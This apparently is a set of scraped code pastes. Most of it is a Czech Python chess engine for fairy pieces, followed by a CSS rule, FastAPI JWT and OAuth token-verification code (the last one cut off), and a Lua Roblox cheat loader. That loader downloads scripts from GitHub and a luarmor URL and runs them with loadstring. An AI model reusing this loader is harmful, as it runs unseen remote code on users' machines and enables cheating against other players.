            directions = [(1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
        
        elif piece_type == 'q':
            # Dáma
            directions = [(0, 1), (0, -1), (1, 0), (-1, 0), (1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
        
        elif piece_type == 'k':
            # Král
            king_moves = [(0, 1), (0, -1), (1, 0), (-1, 0), (1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in king_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
            
            # Rošáda - pouze pokud je povoleno kontrolovat (vyhneme se rekurzi)
            if check_castling and not self.is_in_check(is_white):
                # Krátká rošáda
                castling_key = 'K' if is_white else 'k'
                if self.castling_rights[castling_key]:
                    if (self.board[row][col + 1] == '' and self.board[row][col + 2] == '' and
                        not self.is_square_attacked(row, col + 1, not is_white) and
                        not self.is_square_attacked(row, col + 2, not is_white)):
                        moves.append((row, col + 2))
                
                # Dlouhá rošáda
                castling_key = 'Q' if is_white else 'q'
                if self.castling_rights[castling_key]:
                    if (self.board[row][col - 1] == '' and self.board[row][col - 2] == '' and
                        self.board[row][col - 3] == '' and
                        not self.is_square_attacked(row, col - 1, not is_white) and
                        not self.is_square_attacked(row, col - 2, not is_white)):
                        moves.append((row, col - 2))
        
        elif piece_type == 'a':  # Amazonka (kůň + dáma)
            # Tahy dámy
            directions = [(0, 1), (0, -1), (1, 0), (-1, 0), (1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
            # Tahy koně
            knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1), (1, 2), (1, -2), (-1, 2), (-1, -2)]
            for dr, dc in knight_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
        
        elif piece_type == 'c':  # Cyril (kůň + věž)
            # Tahy věže
            directions = [(0, 1), (0, -1), (1, 0), (-1, 0)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
            # Tahy koně
            knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1), (1, 2), (1, -2), (-1, 2), (-1, -2)]
            for dr, dc in knight_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
        
        elif piece_type == 'e':  # Eve (kůň + střelec)
            # Tahy střelce
            directions = [(1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
            # Tahy koně
            knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1), (1, 2), (1, -2), (-1, 2), (-1, -2)]
            for dr, dc in knight_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
        
        return moves
    
    def is_square_attacked(self, row: int, col: int, by_white: bool) -> bool:
        """"""Zjistí, zda je pole napadené danou barvou""""""
        for r in range(8):
            for c in range(8):
                piece = self.board[r][c]
                if piece != '' and self.is_white_piece(piece) == by_white:
                    # Nekontroluji rošádu při detekci napadení (vyhneme se rekurzi)
                    moves = self.get_piece_moves(r, c, check_castling=False)
                    if (row, col) in moves:
                        return True
        return False
    
    def find_king(self, is_white: bool) -> Tuple[int, int]:
        """"""Najde krále dané barvy""""""
        king = 'K' if is_white else 'k'
        for r in range(8):
            for c in range(8):
                if self.board[r][c] == king:
                    return (r, c)
        return (-1, -1)  # Král nenalezen
    
    def is_in_check(self, is_white: bool) -> bool:
        """"""Zjistí, zda je král v šachu""""""
        king_pos = self.find_king(is_white)
        if king_pos == (-1, -1):
            return False
        return self.is_square_attacked(king_pos[0], king_pos[1], not is_white)
    
    def make_move(self, from_pos: Tuple[int, int], to_pos: Tuple[int, int]) -> bool:
        """"""Provede tah a vrátí True, pokud je legální""""""
        from_row, from_col = from_pos
        to_row, to_col = to_pos
        
        piece = self.board[from_row][from_col]
        if piece == '':
            return False
        
        is_white = self.is_white_piece(piece)
        if is_white != self.white_to_move:
            return False
        
        # Zkontroluj, zda je tah v seznamu možných tahů
        possible_moves = self.get_piece_moves(from_row, from_col)
        if (to_row, to_col) not in possible_moves:
            return False
        
        # Ulož původní stav
        original_board = copy.deepcopy(self.board)
        original_castling = copy.deepcopy(self.castling_rights)
        original_en_passant = self.en_passant
        
        # Proveď tah
        captured_piece = self.board[to_row][to_col]
        self.board[to_row][to_col] = piece
        self.board[from_row][from_col] = ''
        
        # Speciální tahy
        piece_type = piece.lower()
        
        # En passant
        if piece_type == 'p' and self.en_passant and f""{chr(ord('a') + to_col)}{8 - to_row}"" == self.en_passant:
            if is_white:
                self.board[to_row + 1][to_col] = ''
            else:
                self.board[to_row - 1][to_col] = ''
        
        # Rošáda
        if piece_type == 'k' and abs(to_col - from_col) == 2:
            if to_col > from_col:  # Krátká rošáda
                self.board[from_row][7] = ''
                self.board[from_row][5] = 'R' if is_white else 'r'
            else:  # Dlouhá rošáda
                self.board[from_row][0] = ''
                self.board[from_row][3] = 'R' if is_white else 'r'
        
        # Aktualizace en passant
        if piece_type == 'p' and abs(to_row - from_row) == 2:
            self.en_passant = f""{chr(ord('a') + from_col)}{8 - (from_row + to_row) // 2}""
        else:
            self.en_passant = None
        
        # Aktualizace rošádových práv
        if piece_type == 'k':
            if is_white:
                self.castling_rights['K'] = False
                self.castling_rights['Q'] = False
            else:
                self.castling_rights['k'] = False
                self.castling_rights['q'] = False
        elif piece_type == 'r':
            if from_row == 0 or from_row == 7:
                if from_col == 0:
                    key = 'Q' if from_row == 7 else 'q'
                    self.castling_rights[key] = False
                elif from_col == 7:
                    key = 'K' if from_row == 7 else 'k'
                    self.castling_rights[key] = False
        
        # Zkontroluj, zda vlastní král není v šachu
        if self.is_in_check(is_white):
            # Vrať původní stav
            self.board = original_board
            self.castling_rights = original_castling
            self.en_passant = original_en_passant
            return False
        
        # Tah je legální
        self.white_to_move = not self.white_to_move
        if not self.white_to_move:
            self.fullmove_number += 1
        
        if captured_piece or piece_type == 'p':
            self.halfmove_clock = 0
        else:
            self.halfmove_clock += 1
        
        return True
    
    def undo_move(self, from_pos: Tuple[int, int], to_pos: Tuple[int, int], 
                  captured_piece: str, old_castling: dict, old_en_passant: str,
                  old_halfmove: int, old_fullmove: int, was_white_to_move: bool):
        """"""Vrátí tah zpět""""""
        from_row, from_col = from_pos
        to_row, to_col = to_pos
        
        piece = self.board[to_row][to_col]
        self.board[from_row][from_col] = piece
        self.board[to_row][to_col] = captured_piece
        
        # Vrácení speciálních tahů
        piece_type = piece.lower()
        
        # Rošáda
        if piece_type == 'k' and abs(to_col - from_col) == 2:
            if to_col > from_col:  # Krátká rošáda
                self.board[from_row][7] = 'R' if self.is_white_piece(piece) else 'r'
                self.board[from_row][5] = ''
            else:  # Dlouhá rošáda
                self.board[from_row][0] = 'R' if self.is_white_piece(piece) else 'r'
                self.board[from_row][3] = ''
        
        # En passant
        if piece_type == 'p' and old_en_passant and f""{chr(ord('a') + to_col)}{8 - to_row}"" == old_en_passant:
            if self.is_white_piece(piece):
                self.board[to_row + 1][to_col] = 'p'
            else:
                self.board[to_row - 1][to_col] = 'P'
        
        self.castling_rights = old_castling
        self.en_passant = old_en_passant
        self.halfmove_clock = old_halfmove
        self.fullmove_number = old_fullmove
        self.white_to_move = was_white_to_move
    
    def get_all_legal_moves(self) -> List[Tuple[Tuple[int, int], Tuple[int, int]]]:
        """"""Získá všechny legální tahy pro aktuálního hráče""""""
        legal_moves = []
        
        for row in range(8):
            for col in range(8):
                piece = self.board[row][col]
                if piece != '' and self.is_white_piece(piece) == self.white_to_move:
                    moves = self.get_piece_moves(row, col)
                    for to_row, to_col in moves:
                        # Zkopíruj stav
                        original_state = self.save_state()
                        
                        # Zkus tah
                        if self.make_move((row, col), (to_row, to_col)):
                            legal_moves.append(((row, col), (to_row, to_col)))
                        
                        # Vrať stav
                        self.restore_state(original_state)
        
        return legal_moves
    
    def save_state(self):
        """"""Uloží aktuální stav hry""""""
        return {
            'board': copy.deepcopy(self.board),
            'white_to_move': self.white_to_move,
            'castling_rights': copy.deepcopy(self.castling_rights),
            'en_passant': self.en_passant,
            'halfmove_clock': self.halfmove_clock,
            'fullmove_number': self.fullmove_number
        }
    
    def restore_state(self, state):
        """"""Obnoví uložený stav hry""""""
        self.board = state['board']
        self.white_to_move = state['white_to_move']
        self.castling_rights = state['castling_rights']
        self.en_passant = state['en_passant']
        self.halfmove_clock = state['halfmove_clock']
        self.fullmove_number = state['fullmove_number']
    
    def get_material_balance(self) -> int:
        """"""Spočítá materiální vyváženost (pozitivní = výhoda bílého)""""""
        balance = 0
        for row in range(8):
            for col in range(8):
                piece = self.board[row][col]
                if piece != '' and piece.lower() != 'k':  # Ignoruj krále
                    balance += self.piece_values.get(piece, 0)
        return balance
    
    def evaluate_position(self) -> int:
        """"""Ohodnotí pozici s lepším rozlišením koncových pozic""""""
        # Rychlá kontrola matu/patu před materiálním hodnocením
        if self.is_checkmate():
            if self.white_to_move:  # Bílý v matu -> černý vyhrál
                return -999999
            else:  # Černý v matu -> bílý vyhrál
                return 999999
                
        elif self.is_stalemate():
            # Pat: ve vítězné pozici je to neúspěch
            material_balance = self.get_material_balance()
            if material_balance > 300:  # Bílý má výhodu -> pat je velmi špatný
                return -10000  
            elif material_balance < -300:  # Černý má výhodu -> pat je velmi dobrý pro bílého
                return 10000
            else:
                return 0  # Vyrovnaná pozice
        
        # Materiální hodnocení
        score = self.get_material_balance()
        
        # Bonus pro pokročilé koncovky - motivace k matu
        if abs(score) > 500:  # Významná materiální výhoda
            # Penalty za vzdálenost králů (v koncovce chceme krále blízko)
            white_king = self.find_king(True)
            black_king = self.find_king(False)
            
            if white_king != (-1, -1) and black_king != (-1, -1):
                king_distance = abs(white_king[0] - black_king[0]) + abs(white_king[1] - black_king[1])
                if score > 0:  # Bílý vede
                    score -= king_distance * 10  # Penalty za vzdálené krále
                else:  # Černý vede
                    score += king_distance * 10
        
        return score
    
    def is_checkmate(self) -> bool:
        """"""Zjistí, zda je mat""""""
        if not self.is_in_check(self.white_to_move):
            return False
        
        legal_moves = self.get_all_legal_moves()
        return len(legal_moves) == 0
    
    def is_stalemate(self) -> bool:
        """"""Zjistí, zda je pat""""""
        if self.is_in_check(self.white_to_move):
            return False
        
        legal_moves = self.get_all_legal_moves()
        return len(legal_moves) == 0
    
    def is_game_over(self) -> Tuple[bool, str]:
        """"""Zjistí, zda je hra u konce""""""
        if self.is_checkmate():
            winner = ""Černý"" if self.white_to_move else ""Bílý""
            return True, f""Mat! Vyhrál {winner}.""
        elif self.is_stalemate():
            return True, ""Pat! Remíza.""
        elif self.halfmove_clock >= 100:
            return True, ""Remíza podle pravidla 50 tahů.""
        
        return False, """"
    
    def minimax(self, depth: int, alpha: int, beta: int, maximizing: bool, 
                path: List[str]) -> Tuple[int, List[str]]:
        """"""Minimax algoritmus s alfa-beta pruningem - OPRAVENO PRO MAT""""""
        
        # Kontrola konce hry
        if self.is_checkmate():
            # Mat: kdo vyhrál?
            if self.white_to_move:  # Bílý je na tahu ale je v matu -> černý vyhrál
                return (-999999 + len(path), path)
            else:  # Černý je na tahu ale je v matu -> bílý vyhrál  
                return (999999 - len(path), path)
                
        elif self.is_stalemate():
            # NOVÁ LOGIKA: Pat je vždy remíza, ale ve vítězné pozici je to selhání
            material_balance = self.get_material_balance()
            
            if material_balance > 300:  # Bílý má výraznou výhodu
                return (-10000, path)  # Pat ve vítězné pozici je velmi špatný pro bílého
            elif material_balance < -300:  # Černý má výraznou výhodu  
                return (10000, path)   # Pat ve vítězné pozici je velmi špatný pro černého
            else:
                return (0, path)  # Vyrovnaná pozice -> pat je OK
                
        elif self.halfmove_clock >= 100:
            return (0, path)
        
        if depth == 0:
            return (self.evaluate_position(), path)
        
        legal_moves = self.get_all_legal_moves()
        
        if maximizing:
            max_eval = float('-inf')
            best_path = path
            
            for move in legal_moves:
                # Ulož stav
                original_state = self.save_state()
                
                # Proveď tah
                self.make_move(move[0], move[1])
                move_notation = f""{chr(ord('a') + move[0][1])}{8 - move[0][0]}-{chr(ord('a') + move[1][1])}{8 - move[1][0]}""
                new_path = path + [move_notation]
                
                eval_score, eval_path = self.minimax(depth - 1, alpha, beta, False, new_path)
                
                if eval_score > max_eval:
                    max_eval = eval_score
                    best_path = eval_path
                
                # Vrať stav
                self.restore_state(original_state)
                
                alpha = max(alpha, eval_score)
                if beta <= alpha:
                    break
            
            return (max_eval, best_path)
        
        else:
            min_eval = float('inf')
            best_path = path
            
            for move in legal_moves:
                # Ulož stav
                original_state = self.save_state()
                
                # Proveď tah
                self.make_move(move[0], move[1])
                move_notation = f""{chr(ord('a') + move[0][1])}{8 - move[0][0]}-{chr(ord('a') + move[1][1])}{8 - move[1][0]}""
                new_path = path + [move_notation]
                
                eval_score, eval_path = self.minimax(depth - 1, alpha, beta, True, new_path)
                
                if eval_score < min_eval:
                    min_eval = eval_score
                    best_path = eval_path
                
                # Vrať stav
                self.restore_state(original_state)
                
                beta = min(beta, eval_score)
                if beta <= alpha:
                    break
            
            return (min_eval, best_path)
    
    def find_best_move(self, max_depth: int = 10) -> Tuple[Optional[List[str]], int]:
        """"""Najde nejlepší tah pomocí iterativního prohloubení""""""
        print(f""Hledání nejlepšího tahu (maximální hloubka: {max_depth})..."")
        print(f""Na tahu: {'Bílý' if self.white_to_move else 'Černý'}"")
        
        # Zkontroluj materiální situaci
        material_balance = self.get_material_balance()
        if material_balance > 300:
            print(f""Bílý má materiální výhodu ({material_balance} bodů) - hledám mat!"")
        elif material_balance < -300:
            print(f""Černý má materiální výhodu ({-material_balance} bodů) - bráním se!"")
        print()
        
        best_path = None
        best_score = 0
        
        for depth in range(1, max_depth + 1):
            # Přidání časového razítka před každou hloubku
            current_time = datetime.now().strftime(""%H:%M:%S"")
            
            start_time = time.time()
            
            # OPRAVA: maximizing musí odpovídat tomu, kdo je na tahu!
            # Bílý maximalizuje (+), černý minimalizuje (-)
            score, path = self.minimax(depth, float('-inf'), float('inf'), self.white_to_move, [])
            
            end_time = time.time()
            elapsed = end_time - start_time
            
            print(f""[{current_time}] Hloubka {depth}: skóre {score}, čas {elapsed:.3f}s"")
            
            best_path = path
            best_score = score
            
            # Pokud byl nalezen mat, skonči
            if abs(score) > 900000:
                print(f""Nalezen mat v {len(path)} tazích!"")
                break
                
            # Pokud je skóre příliš nízké ve vítězné pozici, pokračuj v hledání
            if material_balance > 300 and score < -500:
                print(f""Skóre {score} je příliš nízké pro vítěznou pozici, pokračujem..."")
        
        return best_path, best_score
    
    def play_game(self, initial_fen: str = None, max_depth: int = 6):
        """"""Spustí hru s automatickým hraním""""""
        if initial_fen:
            self.load_fen(initial_fen)
        else:
            # Standardní počáteční pozice
            self.load_fen(""rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1"")
        
        print(""=== ŠACHOVÝ ENGINE S NESTANDARDNÍMI FIGURAMI ==="")
        print(""Legenda figur:"")
        print(""A/a = Amazonka (Kůň + Dáma)"")
        print(""C/c = Cyril (Kůň + Věž)"")
        print(""E/e = Eve (Kůň + Střelec)"")
        print()
        
        print(""Počáteční pozice:"")
        print(f""FEN: {self.to_fen()}"")
        self.print_board()
        
        move_count = 0
        # Historie provedených tahů
        executed_moves = []
        
        while True:
            game_over, result = self.is_game_over()
            if game_over:
                print(result)
                break
            
            move_count += 1
            print(f""\n=== TAH {move_count} ==="")
            
            best_path, score = self.find_best_move(max_depth)
            
            if not best_path:
                print(""Žádný tah nenalezen!"")
                break
            
            # Simuluj celou cestu
            if abs(score) > 900000:
                print(f""\nNalezená cesta k matu ({len(best_path)} tahů):"")
            elif abs(score) > 5000:
                print(f""\nNalezená silná cesta ({len(best_path)} tahů):"")
            elif abs(score) < -5000:
                print(f""\nVarování: Možný pat v {len(best_path)} tazích!"")
            else:
                print(f""\nNalezená cesta ({len(best_path)} tahů):"")
            
            current_engine = ChessEngine()
            current_engine.restore_state(self.save_state())
            
            # Vypíš počáteční pozici
            print(f""\nPočáteční pozice:"")
            print(f""FEN: {current_engine.to_fen()}"")
            current_engine.print_board()
            
            for i, move_notation in enumerate(best_path):
                # Parsuj a proveď tah
                from_pos = (8 - int(move_notation[1]), ord(move_notation[0]) - ord('a'))
                to_pos = (8 - int(move_notation[4]), ord(move_notation[3]) - ord('a'))
                
                if not current_engine.make_move(from_pos, to_pos):
                    print(""Chyba při provádění tahu!"")
                    break
                
                # Teď vypíš pozici PO provedení tahu
                print(f""\nTah {i + 1}: {move_notation}"")
                print(f""FEN: {current_engine.to_fen()}"")
                current_engine.print_board()
                
                game_over, result = current_engine.is_game_over()
                if game_over:
                    print(f""{result}"")
                    return
            
            # Proveď první tah z nalezené cesty
            if best_path:
                first_move = best_path[0]
                from_pos = (8 - int(first_move[1]), ord(first_move[0]) - ord('a'))
                to_pos = (8 - int(first_move[4]), ord(first_move[3]) - ord('a'))
                
                # Zapamatuj si, kdo hraje před tahem
                current_player = ""Bílý"" if self.white_to_move else ""Černý""
                
                if self.make_move(from_pos, to_pos):
                    # Přidej tah do historie
                    executed_moves.append(first_move)
                    
                    print(f""\nProveden tah: {first_move} ({current_player})"")
                    
                    # Vytiskni celou historii tahů s číslováním
                    print(f""\nCelá historie tahů ({len(executed_moves)} tahů):"")
                    history_display = []
                    for i, move in enumerate(executed_moves):
                        if i % 2 == 0:  # Bílý tah
                            move_number = (i // 2) + 1
                            history_display.append(f""{move_number}.{move}"")
                        else:  # Černý tah
                            history_display.append(move)
                    
                    # Rozděl do řádků po 6 tazích (3 páry)
                    for i in range(0, len(history_display), 6):
                        chunk = history_display[i:i+6]
                        print("" "".join(chunk))
                else:
                    print(""Chyba při provádění prvního tahu!"")
                    break
            else:
                break

# Spuštění enginu
if __name__ == ""__main__"":
    engine = ChessEngine()
    
    # Testovací pozice - zajímavější matový problém
    # Černý král v rohu, bílá Amazonka a král pro demonstraci síly Amazonky
    test_fen = ""k7/8/2A5/8/8/8/8/K7 w - - 0 1""
    test_fen = ""7A/8/8/8/8/8/6k1/1K6 w - - 0 1""

    test_fen = ""8/8/8/8/8/5BN1/5K1k/8 b - - 0 1""

    test_fen = ""8/8/8/5N2/8/5B1k/5K2/8 b - - 0 1""

#    test_fen = ""8/8/8/8/A7/4c1k1/8/6K1 w - - 0 1""
    
    print(f""Používám testovací pozici: {test_fen}"")
    print(""Pozice: Střelec na f3, Kůň na g3, Bílý král na f2, Černý král na h2"")
    engine.play_game(test_fen, max_depth=9)"
zVhMbQ7t,Untitled,alex91ckua,CSS,Tuesday 22nd of July 2025 05:06:48 AM CDT,".wcipi-container {
    width: 100%;
}"
kCiwcaBb,lua,JohnAlvinJA,Lua,Tuesday 22nd of July 2025 03:38:48 AM CDT,"repeat wait() until game:IsLoaded() and game:FindFirstChild(""CoreGui"") and pcall(function() return game.CoreGui end)
local _function = {
    [""getid""] = function()
        local g = game.GameId
        if not premium then
            if g == 7436755782 then return ""483d639ad74a7814ff1057d68cec56c2"" -- Grow a Garden
            elseif g == 7018190066 then return ""d3a76114c1ea182127b88170b6043d11"" -- Dead Rails
            elseif g == 5750914919 then return ""bfd8ac56165c2caf1eebc5a14ccdb134"" -- Fisch
            elseif g == 6325068386 then return ""a0ad31cf58a8bd98dd82fa1fb648290f"" -- Blue Lock Rivals
            elseif g == 4777817887 then return ""d53370331c9ca16ce3479c3ac6ae5a78"" -- Blade Ball
            elseif g == 994732206 then return ""446a745866c1abf8459657502b7818fc"" -- Blox Fruit
            elseif g == 4658598196 then return ""27394fa4dc9c7268a839f2c98b6a35f7"" -- Attack On Titan Revolution
            elseif g == 6331902150 then return ""0771107275ffabca9221c264306214f9"" -- Forsaken
            elseif g == 7709344486 then return ""4039bc61ee76ab6f5247b15a0ebf5f60"" end -- Steal a Brainrot
        else
            if g == 7436755782 then return ""65c66a87b33565a9dea1a54b798b6b2a"" -- Grow a Garden
            elseif g == 7018190066 then return ""a3e99a8c1a465fc973e7aa0dda0e220c"" -- Dead Rails
            elseif g == 5750914919 then return ""8782b4febedc346da2f704fa97d11601"" -- Fisch
            elseif g == 6325068386 then return ""50ba70185011d66f3ed97e4e7f50bd11"" -- Blue Lock Rivals
            elseif g == 4777817887 then return ""6f48a7a95292a0885256d242900d81fb"" -- Blade Ball
            elseif g == 994732206 then return ""1ba7f8bc6888d119d65cdafbe3d78527"" -- Blox Fruit
            elseif g == 4658598196 then return ""5698b5c40f0217c268e673ef5e7b6581"" -- Attack On Titan Revolution
            elseif g == 6331902150 then return ""811768c852543782f63839177a263d53"" -- Forsaken 
            elseif g == 7709344486 then return ""36bb351f4d722c58af15efcb417b67da"" end -- Steal a Brainrot
        end
    end,
    [""gamename""] = function()
        local g = game.GameId
        if g == 5750914919 then return ""Fisch""
        elseif g == 7018190066 then return ""Dead Rails""
        elseif g == 6325068386 then return ""Blue Lock Rivals""
        elseif g == 4777817887 then return ""Blade Ball""
        elseif g == 7436755782 then return ""Grow a Garden""
        elseif g == 994732206 then return ""Blox Fruit""
        elseif g == 4658598196 then return ""Attack On Titan Revolution""
        elseif g == 6331902150 then return ""Forsaken""
        elseif g == 7709344486 then return ""Steal a Brainrot""
        end
    end,
    [""load""] = function(url)
        local game_url = game:HttpGet(url)
        return (load or loadstring)(game_url)()
    end
}
local script_id, game_name = _function.getid(), _function.gamename()
if script_id then
    game.StarterGui:SetCore(
        ""SendNotification"",
        {
            Title = ""NatHub Loaded!"",
            Text = game_name .. "" Script Loaded!"",
            Icon = ""rbxassetid://99764942615873"",
            Duration = 5
        }
    )
    if premium then
        local auth = _function.load(""https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/keysystem.lua"")
        local auth_status = auth(script_id)
        repeat task.wait() until auth_status.validated
    end
    script_key = script_key
    if premium then premium = true; is_premium = true end
    _function.load(""https://api.luarmor.net/files/v4/loaders/"" .. script_id .. "".lua"")
end"
SpyrxtES,JWT Authentication,elyte5star,Python,Tuesday 22nd of July 2025 03:26:55 AM CDT,"from starlette.status import (
    HTTP_401_UNAUTHORIZED,
    HTTP_403_FORBIDDEN,
    HTTP_404_NOT_FOUND,
)
from starlette.requests import Request
from fastapi.security.utils import get_authorization_scheme_param
from fastapi.openapi.models import HTTPBearer as HTTPBearerModel
from jose import JWTError, jwt
import time
from modules.settings.configuration import ApiConfig
from modules.repository.queries.common import CommonQueries
from modules.security.current_user import JWTPrincipal
from fastapi.security.base import SecurityBase
from fastapi.exceptions import HTTPException
from pydantic import BaseModel, Field


cfg = ApiConfig().from_toml_file().from_env_file()
queries = CommonQueries(cfg)


class JWTPrincipal(BaseModel):
    user_id: str = Field(serialization_alias=""userId"")
    username: str
    email: str
    active: bool
    enabled: bool
    roles: list[str]
    admin: bool
    expires: float
    discount: float
    token_id: str = Field(serialization_alias=""tokenId"")



class JWTBearer(SecurityBase):

    def __init__(
        self,
        scheme_name: str | None = None,
        auto_error: bool = True,
        allowed_roles: list = cfg.roles,
        auth_method: str | None = None,
    ) -> None:
        super().__init__()
        self.auto_error = auto_error
        self.scheme_name = scheme_name or self.__class__.__name__
        self.allowed_roles = allowed_roles
        self.model = HTTPBearerModel(
            description=""Bearer token"",
        )

    async def __call__(self, request: Request) -> JWTPrincipal | None:
        authorization = request.headers.get(""Authorization"", None)
        scheme, token = get_authorization_scheme_param(authorization)
        if not (authorization and scheme and token):
            if self.auto_error:
                raise HTTPException(
                    status_code=HTTP_403_FORBIDDEN, detail=""Not authenticated""
                )
            else:
                return None
        if scheme.lower() != ""bearer"":
            if self.auto_error:
                raise HTTPException(
                    status_code=HTTP_401_UNAUTHORIZED,
                    detail=""Invalid authentication credentials"",
                )
            else:
                return None
        if self.verify_jwt(token) is None:
            if self.auto_error:
                raise HTTPException(
                    status_code=HTTP_401_UNAUTHORIZED,
                    detail=""Invalid token or expired token."",
                    headers={""WWW-Authenticate"": ""Bearer""},
                )
            else:
                return None
        current_user = await self.check_user(self.payload[""userId""])
        return current_user

    async def check_user(self, user_id: str) -> JWTPrincipal:
        db_user = await queries.find_user_by_id(user_id)
        if db_user is None:
            raise HTTPException(
                status_code=HTTP_404_NOT_FOUND,
                detail=""User session not found"",
            )
        roles = [""USER""] if not db_user.admin else [""USER"", ""ADMIN""]
        matches = set(self.allowed_roles).intersection(set(roles))
        if len(matches) == 0:
            raise HTTPException(
                status_code=HTTP_403_FORBIDDEN, detail=""Not enough permissions""
            )
        current_user = JWTPrincipal(
            user_id=self.payload[""userId""],
            email=self.payload[""email""],
            username=self.payload[""sub""],
            active=self.payload[""active""],
            enabled=self.payload[""enabled""],
            expires=self.payload[""exp""],
            admin=self.payload[""admin""],
            roles=self.payload[""roles""],
            discount=self.payload[""discount""],
            token_id=self.payload[""jti""],
        )
        return current_user

    def verify_jwt(self, token: str) -> dict | None:
        if token is None:
            return None
        try:
            self.payload = jwt.decode(
                token,
                cfg.secret_key,
                algorithms=[cfg.algorithm],
            )
            return self.payload if self.payload[""exp""] >= time.time() else None
        except JWTError:
            return None
"
xtvwcwsb,MSAL/Google access token verification,elyte5star,Python,Tuesday 22nd of July 2025 03:16:25 AM CDT,"from typing import cast, Any
from starlette.requests import Request
from modules.settings.configuration import ApiConfig
from fastapi.security.utils import get_authorization_scheme_param
from fastapi.openapi.models import (
    OAuthFlows as OAuthFlowsModel,
)
from fastapi.security.base import SecurityBase
from fastapi.openapi.models import OAuthFlowAuthorizationCode
from starlette.status import (
    HTTP_401_UNAUTHORIZED,
    HTTP_403_FORBIDDEN,
    HTTP_404_NOT_FOUND,
    HTTP_400_BAD_REQUEST,
)
from fastapi.exceptions import HTTPException
from jose import JWTError, jwt
from httpx import AsyncClient, HTTPError, Response
from fastapi.openapi.models import OAuth2 as OAuth2Model
from modules.utils.misc import date_time_now_utc, time_delta
from fastapi.security import SecurityScopes
from datetime import datetime





SCHEME_NAME = ""OAuthorization2CodePKCEBearer""
DESC = ""Authorization code with PKCE ""


class OAuth2CodeBearer(SecurityBase):

    def __init__(
        self,
        authorization_url: str,
        token_url: str,
        auth_method: str,
        scopes: dict[str, str],
        flows: OAuthFlowsModel | dict[str, dict[str, Any]] | None = None,
        scheme_name: str | None = SCHEME_NAME,
        description: str | None = DESC,
        refresh_url: str | None = None,
    ):
        self.auth_method = auth_method

        # ADD MORE OAUTHFLOWS AS NEEDED

        if not flows:
            flows = OAuthFlowsModel(
                authorizationCode=OAuthFlowAuthorizationCode(
                    authorizationUrl=authorization_url,
                    tokenUrl=token_url,
                    refreshUrl=refresh_url,
                    scopes=scopes,
                ),
            )
        self.model = OAuth2Model(
            flows=cast(OAuthFlowsModel, flows), description=description
        )
        self.scheme_name = (
            f""{auth_method.capitalize()}{scheme_name}"" or self.__class__.__name__
        )

        self.auth_method = auth_method
        # A cache for Microsoft public keys {'LOCAL': [], 'MSAL': []}
        self.public_keys_cache: dict[str, list] = {
            method: [] for method in cfg.auth_methods
        }
        self.next_ext_api_call_time: datetime | None = None

    async def __call__(
        self, security_scopes: SecurityScopes, request: Request
    ) -> dict[str, Any] | None:
        authorization = request.headers.get(""Authorization"", None)
        scheme, token = get_authorization_scheme_param(authorization)
        if not (authorization and scheme and token):
            raise HTTPException(
                status_code=HTTP_403_FORBIDDEN, detail=""Not authenticated""
            )
        if scheme.lower() != ""bearer"":
            raise HTTPException(
                status_code=HTTP_401_UNAUTHORIZED,
                detail=""Invalid authentication credentials"",
            )

        if self.auth_method == ""MSAL"":
            verified_claims = await self.verify_msal_jwt(
                token, security_scopes.scopes, self.auth_method
            )
        else:
            verified_claims = await self.verify_google_jwt(
                token,
                security_scopes.scopes,
            )
        return verified_claims

    async def verify_google_jwt(
        self,
        access_token: str,
        required_scopes: list[str],
    ) -> dict:
        if not access_token:
            raise HTTPException(
                status_code=HTTP_401_UNAUTHORIZED,
                detail=""Authorization token missing or invalid"",
            )
        try:
